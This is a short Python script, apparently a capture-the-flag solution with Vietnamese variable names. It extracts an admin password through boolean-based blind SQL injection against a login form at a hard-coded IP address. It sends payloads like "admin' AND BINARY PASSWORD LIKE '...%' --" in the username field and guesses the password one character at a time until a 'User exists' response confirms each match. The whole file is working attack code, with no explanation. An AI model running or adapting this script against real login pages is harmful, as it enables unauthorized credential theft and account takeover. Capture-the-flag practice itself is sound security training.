import requests

url = 'http://103.24.246.118:5551/echo/index.php'
myobj = {
    'username': "admin' AND PASSWORD LIKE 'TTHL{%' --",
    "login": "Submit"
    }

# x = requests.post(url, data  = myobj)

# print(x.text)

matKhauHienTai = 'TTHL{'
kyTuHienTai = ''

while kyTuHienTai != '}':
    for i in range(33, 127):
        # print(i, ' => ', chr(i))
        kyTuHienTai = chr(i)
        if(kyTuHienTai == '%'):
            continue
        matKhauTam = matKhauHienTai + kyTuHienTai
        myobj = {
            'username': f"admin' AND BINARY PASSWORD LIKE '{matKhauTam}%' --",
            "login": "Submit"
        }
        x = requests.post(url, data  = myobj)
        if("User exists" in x.text):
            matKhauHienTai = matKhauTam
            print(matKhauHienTai)
            break
        if(i == 126):
            print('xong')
            break